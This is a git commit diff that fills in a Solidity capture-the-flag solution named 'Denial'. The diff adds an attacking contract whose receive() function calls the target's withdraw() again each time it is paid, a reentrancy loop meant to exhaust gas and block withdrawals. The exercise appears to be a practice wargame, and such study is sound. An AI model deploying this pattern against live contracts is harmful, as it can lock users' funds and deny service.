88a22d698418d47ed29394b06eaac7559d31679f
Swapneel Bobba <swapneel.bobba123@gmail.com>
2022-05-23 00:53:01 -0400

    Denial solution

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -4,10 +4,15 @@ import "./Denial.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
+    Denial public denial;
 
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
+        denial = Denial(_contractAddress);
     }
 
     //Code me!
+    receive() external payable {
+        denial.withdraw();
+    }
 }
